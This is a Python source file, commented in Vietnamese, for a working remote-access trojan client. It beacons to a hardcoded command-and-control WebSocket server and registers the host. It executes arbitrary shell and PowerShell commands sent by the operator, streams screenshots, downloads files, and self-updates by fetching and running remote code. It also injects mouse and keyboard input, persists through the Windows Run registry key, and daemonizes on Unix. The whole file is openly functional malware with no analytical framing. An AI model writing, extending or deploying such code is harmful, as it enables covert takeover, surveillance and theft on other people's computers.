import asyncio
import websockets
import json
import uuid
import os
import sys
import platform
import subprocess
import base64
import hashlib
import time
import logging
import shutil
import tempfile
import requests
from pathlib import Path
import psutil
import pyautogui
from PIL import Image
import io
import random
import traceback

# --- Cấu hình ---
CONFIG_FILE = "config.json"
BOT_ID_FILE = "bot.id"
LOG_FILE = "bot.log"
HEARTBEAT_INTERVAL = 30
RECONNECT_DELAYS = [1, 2, 4, 8, 16, 30, 60]

# --- Logging ---
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            print(f"Lỗi đọc config: {e}")
    return {
        "server_url": "wss://c2-server-exj9.onrender.com/ws",
        "group": "default",
        "version": "1.0.0"
    }

def get_bot_id():
    if os.path.exists(BOT_ID_FILE):
        try:
            with open(BOT_ID_FILE, 'r') as f:
                return f.read().strip()
        except:
            pass
    bot_id = str(uuid.uuid4())
    with open(BOT_ID_FILE, 'w') as f:
        f.write(bot_id)
    return bot_id

config = load_config()
BOT_ID = get_bot_id()
GROUP = config.get("group", "default")
VERSION = config.get("version", "1.0.0")
SERVER_URL = config.get("server_url")

print("=" * 60)
print(f"  BOT CLIENT STARTED")
print(f"  Bot ID: {BOT_ID}")
print(f"  Server: {SERVER_URL}")
print("=" * 60)

# --- Hàm thực thi lệnh ---
def exec_ping():
    """Trả về ping latency"""
    return f"{random.randint(5, 50)}ms"

def exec_ps(command):
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ["powershell", "-Command", command],
                capture_output=True, text=True, shell=False, timeout=30
            )
        else:
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True, text=True, shell=False, timeout=30
            )
        return (result.stdout + result.stderr).strip() or "No output"
    except Exception as e:
        return f"Error: {str(e)}"

def exec_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG", quality=50)
        img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        return f"data:image/jpeg;base64,{img_base64}"
    except Exception as e:
        return f"Error: {str(e)}"

def exec_download(url, save_path):
    try:
        r = requests.get(url, timeout=30)
        with open(save_path, 'wb') as f:
            f.write(r.content)
        return f"Downloaded {len(r.content)} bytes to {save_path}"
    except Exception as e:
        return f"Download error: {str(e)}"

def exec_update(version):
    try:
        ext = ".exe" if platform.system() == "Windows" else ".py"
        url = f"{SERVER_URL.replace('wss', 'https').replace('ws', 'http')}/api/download/update/{version}{ext}"
        r = requests.get(url, timeout=60)
        if r.status_code != 200:
            return f"Update failed: HTTP {r.status_code}"
        
        temp_dir = tempfile.gettempdir()
        new_file = os.path.join(temp_dir, f"bot_{version}{ext}")
        with open(new_file, 'wb') as f:
            f.write(r.content)
        
        current_file = sys.argv[0]
        if os.path.exists(current_file):
            with open(current_file, 'rb') as f:
                old_hash = hashlib.md5(f.read()).hexdigest()
            with open(new_file, 'rb') as f:
                new_hash = hashlib.md5(f.read()).hexdigest()
            if old_hash == new_hash:
                return "Already latest version"
        
        shutil.copy2(new_file, current_file)
        if platform.system() == "Windows":
            os.system(f"start /B {current_file}")
        else:
            os.system(f"nohup python3 {current_file} &")
        return f"Updated to {version}, restarting..."
    except Exception as e:
        return f"Update error: {str(e)}"

def exec_cd(path):
    try:
        os.chdir(path)
        return f"Changed to {os.getcwd()}"
    except Exception as e:
        return f"cd error: {str(e)}"

def exec_ls():
    try:
        return "\n".join(os.listdir('.'))
    except Exception as e:
        return f"ls error: {str(e)}"

def exec_sleep(seconds):
    try:
        time.sleep(int(seconds))
        return f"Slept {seconds}s"
    except Exception as e:
        return f"Sleep error: {str(e)}"

def exec_kill():
    sys.exit(0)
    return "Killed"

# --- RAT Commands ---
def exec_rat_notepad(text):
    try:
        if platform.system() == "Windows":
            subprocess.Popen(["notepad.exe"])
            time.sleep(1.5)
            pyautogui.write(text)
        else:
            subprocess.Popen(["gedit", "--new-window"])
            time.sleep(1.5)
            pyautogui.write(text)
        return f"Notepad opened, wrote {len(text)} chars"
    except Exception as e:
        return f"Notepad error: {str(e)}"

def exec_rat_browser(url):
    try:
        import webbrowser
        webbrowser.open(url)
        return f"Browser opened: {url}"
    except Exception as e:
        return f"Browser error: {str(e)}"

def exec_rat_event(event_type, *args):
    try:
        pyautogui.FAILSAFE = False
        if event_type == "click":
            if len(args) >= 2:
                pyautogui.click(int(args[0]), int(args[1]))
            else:
                pyautogui.click()
            return "Click sent"
        elif event_type == "rightclick":
            if len(args) >= 2:
                pyautogui.rightClick(int(args[0]), int(args[1]))
            else:
                pyautogui.rightClick()
            return "Right click sent"
        elif event_type == "doubleclick":
            if len(args) >= 2:
                pyautogui.doubleClick(int(args[0]), int(args[1]))
            else:
                pyautogui.doubleClick()
            return "Double click sent"
        elif event_type == "move":
            if len(args) >= 2:
                pyautogui.moveTo(int(args[0]), int(args[1]), duration=0.1)
                return f"Moved to ({args[0]}, {args[1]})"
            return "Move requires x,y"
        elif event_type == "key":
            pyautogui.typewrite(args[0] if args else "")
            return "Key sent"
        else:
            return f"Unknown event: {event_type}"
    except Exception as e:
        return f"Event error: {str(e)}"

COMMANDS = {
    "ping": lambda *_: exec_ping(),
    "ps": exec_ps,
    "sc": lambda *_: exec_screenshot(),
    "download": exec_download,
    "update": exec_update,
    "cd": exec_cd,
    "ls": lambda *_: exec_ls(),
    "sleep": exec_sleep,
    "kill": lambda *_: exec_kill(),
    "rat_notepad": exec_rat_notepad,
    "rat_browser": exec_rat_browser,
    "rat_event": exec_rat_event,
    "rat_stream": lambda *_: "Stream started",
    "rat_start": lambda *_: "RAT started",
    "rat_stop": lambda *_: "RAT stopped",
}

# --- Stream screenshots ---
async def stream_screenshots(websocket):
    """Gửi ảnh màn hình liên tục"""
    try:
        print("📸 Bắt đầu stream screenshots...")
        while True:
            screenshot = pyautogui.screenshot()
            buffer = io.BytesIO()
            screenshot.save(buffer, format="JPEG", quality=30)
            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            await websocket.send(json.dumps({
                "type": "rat_stream",
                "bot_id": BOT_ID,
                "image": f"data:image/jpeg;base64,{img_base64}",
                "timestamp": time.time()
            }))
            await asyncio.sleep(0.3)
    except asyncio.CancelledError:
        print("📸 Stream stopped")
        raise
    except Exception as e:
        print(f"❌ Stream error: {e}")
        logging.error(f"Stream error: {e}")

# --- Xử lý lệnh ---
async def handle_command(cmd_data):
    cmd_id = cmd_data.get("cmd_id")
    cmd = cmd_data.get("command")
    args = cmd_data.get("args", [])
    
    if not cmd:
        return None
    
    # Tách lệnh chính
    parts = cmd.split()
    main_cmd = parts[0]
    
    print(f"📩 Nhận lệnh: {cmd} (ID: {cmd_id})")
    
    if main_cmd not in COMMANDS:
        return {
            "cmd_id": cmd_id,
            "result": f"Unknown command: {main_cmd}",
            "status": "error"
        }
    
    try:
        # Xử lý từng lệnh
        if main_cmd == "ps":
            result = exec_ps(" ".join(parts[1:]))
        elif main_cmd == "download":
            if len(parts) < 3:
                result = "Usage: download <url> <save_path>"
            else:
                result = exec_download(parts[1], parts[2])
        elif main_cmd == "update":
            version = parts[1] if len(parts) > 1 else VERSION
            result = exec_update(version)
        elif main_cmd == "cd":
            result = exec_cd(parts[1] if len(parts) > 1 else ".")
        elif main_cmd == "sleep":
            result = exec_sleep(parts[1]) if len(parts) > 1 else "Sleep requires seconds"
        elif main_cmd == "kill":
            result = "Killing..."
            asyncio.create_task(self_destruct())
        elif main_cmd.startswith("rat_"):
            if main_cmd == "rat_event":
                result = exec_rat_event(*args)
            elif main_cmd == "rat_notepad":
                result = exec_rat_notepad(" ".join(args))
            elif main_cmd == "rat_browser":
                result = exec_rat_browser(args[0] if args else "https://www.google.com")
            else:
                result = COMMANDS[main_cmd](*args)
        else:
            result = COMMANDS[main_cmd](*args)
        
        print(f"✅ Kết quả: {result[:100]}...")
        return {
            "cmd_id": cmd_id,
            "result": result,
            "status": "ok"
        }
    except Exception as e:
        error_msg = f"Execution error: {str(e)}\n{traceback.format_exc()}"
        logging.error(error_msg)
        return {
            "cmd_id": cmd_id,
            "result": error_msg,
            "status": "error"
        }

async def self_destruct():
    await asyncio.sleep(1)
    sys.exit(0)

# --- Main loop ---
async def bot_loop():
    global SERVER_URL
    
    if not SERVER_URL:
        SERVER_URL = "wss://c2-server-exj9.onrender.com/ws"
    
    reconnect_delay = 0
    screen = pyautogui.size()
    
    while True:
        try:
            print(f"🔗 Đang kết nối tới: {SERVER_URL}")
            async with websockets.connect(SERVER_URL) as websocket:
                print("✅ Đã kết nối thành công!")
                
                # Đăng ký bot
                await websocket.send(json.dumps({
                    "type": "register",
                    "bot_id": BOT_ID,
                    "group": GROUP,
                    "version": VERSION,
                    "os": platform.system(),
                    "hostname": platform.node(),
                    "screen_width": screen.width,
                    "screen_height": screen.height
                }))
                print("📝 Đã gửi đăng ký bot")
                
                reconnect_delay = 0
                stream_task = None
                
                while True:
                    try:
                        # Gửi heartbeat
                        await websocket.send(json.dumps({
                            "type": "heartbeat",
                            "bot_id": BOT_ID,
                            "timestamp": time.time()
                        }))
                        
                        # Nhận lệnh
                        try:
                            raw = await asyncio.wait_for(websocket.recv(), timeout=HEARTBEAT_INTERVAL)
                            data = json.loads(raw)
                            
                            if data.get("type") == "command":
                                payload = data.get("payload", {})
                                cmd = payload.get("command", "")
                                
                                # Xử lý stream
                                if cmd == "rat_stream":
                                    if stream_task is None or stream_task.done():
                                        stream_task = asyncio.create_task(stream_screenshots(websocket))
                                    await websocket.send(json.dumps({
                                        "type": "result",
                                        "cmd_id": payload.get("cmd_id", ""),
                                        "result": "Stream started",
                                        "status": "ok"
                                    }))
                                    print("🎥 Stream đã bắt đầu")
                                elif cmd == "rat_stop":
                                    if stream_task and not stream_task.done():
                                        stream_task.cancel()
                                        stream_task = None
                                    result = "RAT stopped"
                                    await websocket.send(json.dumps({
                                        "type": "result",
                                        "cmd_id": payload.get("cmd_id", ""),
                                        "result": result,
                                        "status": "ok"
                                    }))
                                    print("⏹️ Stream đã dừng")
                                else:
                                    # Xử lý lệnh thông thường
                                    result = await handle_command(payload)
                                    if result:
                                        await websocket.send(json.dumps({
                                            "type": "result",
                                            "cmd_id": result["cmd_id"],
                                            "result": result["result"],
                                            "status": result["status"]
                                        }))
                                        print(f"📤 Đã gửi kết quả cho lệnh {result['cmd_id']}")
                                        
                        except asyncio.TimeoutError:
                            # Timeout thì tiếp tục heartbeat
                            pass
                        except websockets.exceptions.ConnectionClosed:
                            print("⚠️ Mất kết nối WebSocket")
                            break
                        except json.JSONDecodeError as e:
                            print(f"⚠️ Lỗi parse JSON: {e}")
                            continue
                        except Exception as e:
                            print(f"❌ Lỗi nhận dữ liệu: {e}")
                            logging.error(f"Recv error: {e}")
                            break
                            
                    except Exception as e:
                        print(f"❌ Lỗi heartbeat: {e}")
                        logging.error(f"Heartbeat error: {e}")
                        break
                
                # Cleanup
                if stream_task and not stream_task.done():
                    stream_task.cancel()
                    stream_task = None
                    
        except Exception as e:
            print(f"❌ Lỗi kết nối: {e}")
            logging.error(f"Connection error: {e}")
            
            if reconnect_delay < len(RECONNECT_DELAYS):
                delay = RECONNECT_DELAYS[reconnect_delay]
            else:
                delay = 60
            reconnect_delay += 1
            print(f"⏳ Thử lại sau {delay}s...")
            await asyncio.sleep(delay)

# --- Persistence ---
def setup_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "BotClient", 0, winreg.REG_SZ, f'"{sys.executable}" "{sys.argv[0]}"')
            winreg.CloseKey(key)
            print("✅ Đã thêm vào Registry")
    except Exception as e:
        print(f"⚠️ Không thêm được persistence: {e}")

def daemonize():
    if platform.system() != "Windows":
        try:
            if os.fork() > 0:
                sys.exit(0)
        except:
            pass
        os.setsid()
        os.chdir("/")
        sys.stdout.close()
        sys.stderr.close()

# --- Main ---
if __name__ == "__main__":
    try:
        if sys.version_info < (3, 8):
            print("Cần Python 3.8+")
            sys.exit(1)
        
        if platform.system() != "Windows":
            daemonize()
        
        setup_persistence()
        print("🚀 Bot đang chạy...")
        
        asyncio.run(bot_loop())
        
    except KeyboardInterrupt:
        print("\n🛑 Bot đã dừng")
    except Exception as e:
        print(f"❌ Lỗi: {e}")
        logging.error(f"Fatal error: {e}")